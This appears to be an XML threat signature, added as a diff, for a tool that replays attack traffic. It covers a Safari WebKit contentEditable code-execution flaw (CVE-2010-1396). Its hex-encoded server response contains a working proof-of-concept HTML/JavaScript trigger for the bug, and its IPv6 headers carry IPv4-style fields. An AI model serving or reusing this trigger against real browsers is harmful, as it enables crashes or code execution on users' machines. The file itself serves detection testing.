@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Apple Safari Webkit Option Element ContentEditable Code Execution (IPv6)"/>
+    <EngDesc display="true" value="A vulnerability has been reported in Apple Safari's Webkit that could allow remote attackers to execute arbitrary code on a vulnerable system. The vulnerability is due to the way the vulnerable application removes a particular container element containing another element holding the contentEditable attribute. Remote attackers could exploit this vulnerability by enticing the target user to open a maliciously crafted web page.&#13;&#10;&#13;&#10;Successful exploitation could result in execution of arbitrary code within the security context of the current user. An unsuccessful attempt will terminate the affected application abnormally. (IPv6)"/>
+    <Intent display="true">
+      <item value="Corruption"/>
+    </Intent>
+    <Protocol display="true" value="IPv6/HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Web_Browser"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apple"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Apple_Safari"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="5.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20100615-12"/>
+    <CVEID display="true" value="CVE-2010-1396"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="479c8cf1395741d0a1b45b37604aae8c"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value=""/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634140351229811668"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1278495010" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="srcIP" type="ImperfectControls.IPv6Address" value="null" index="I"/>
+    <NamedVar name="destIPv6" type="ImperfectControls.IPv6Address" value="null" index="J"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="K"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="F">
+      <for index="J"/>
+      <for index="I"/>
+      <for index="K"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:0C:29:95:E5:B8" destMac="00:1B:78:75:79:68" pktType="0800">
+      <IPv6 Version="6" InternetHeaderLength="05" TypeofService="00" TotalLength="01F0" Identification="116A" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="863C" srcIP="$srcIP" destIP="$destIPv6" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="2445" destPort="$HTTPdestPort" SeqNumber="A5406D60" AckNumber="48A8E3A9" HeaderLength="05" WindowSize="FAF0" Checksum="AF4C" UrgentPointer="0000" Options="" Payload="474554202F7E6A7869612F706F632E68746D6C20485454502F312E310D0A486F73743A203137322E31362E312E320D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F77733B20553B2057696E646F7773204E5420352E313B20656E2D555329204170706C655765624B69742F3533312E32322E3720284B48544D4C2C206C696B65204765636B6F292056657273696F6E2F342E302E35205361666172692F3533312E32322E370D0A4163636570743A206170706C69636174696F6E2F786D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C746578742F68746D6C3B713D302E392C746578742F706C61696E3B713D302E382C696D6167652F706E672C2A2F2A3B713D302E350D0A4163636570742D4C616E67756167653A20656E2D55530D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A49662D4D6F6469666965642D53696E63653A204672692C203235204A756E20323031302031373A33343A303920474D540D0A49662D4E6F6E652D4D617463683A2022333862386233322D3162352D34383964653264616538363430220D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:95:E5:B8" pktType="0800">
+        <IPv6 Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0359" Identification="B089" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="25B4" srcIP="$destIPv6" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="2445" SeqNumber="48A8E3A9" AckNumber="A5406F28" HeaderLength="05" WindowSize="1920" Checksum="F9A0" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A204672692C203235204A756E20323031302031373A35333A323720474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E32205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A204672692C203235204A756E20323031302031373A33343A353120474D540D0A455461673A2022333862386233322D3162352D34383964653330326636346330220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203433370D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A3C68746D6C3E0A3C7469746C653E50726F6F66206F6620436F6E63657074204578706C6F69743C2F7469746C653E0A3C686561643E436F707972696768742054454C5553205365637572697479204C6162732E20416C6C205269676874732052657365727665642E0A0A3C736372697074206C616E67756167653D224A617661536372697074223E0A66756E6374696F6E20706F6328290A7B0A20202020766172206F626A656374203D20646F63756D656E742E676574456C656D656E744279496428226F626A65637422293B0A202020206F626A6563742E617070656E644368696C6428646F63756D656E742E637265617465456C656D656E7428226C696E6B2229293B0A202020206F626A6563742E6F6666736574546F703B0A202020206F626A6563742E696E6E657248544D4C203D2022223B0A202020206F626A6563742E76616C75653B0A7D0A3C2F7363726970743E0A3C2F686561643E0A3C626F6479206F6E6C6F61643D706F6328293E0A3C73656C6563742069643D226F626A656374223E3C6F7074696F6E3E54656C75733C2F6F7074696F6E3E3C2F73656C6563743E0A3C2F626F64793E0A3C2F68746D6C3E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
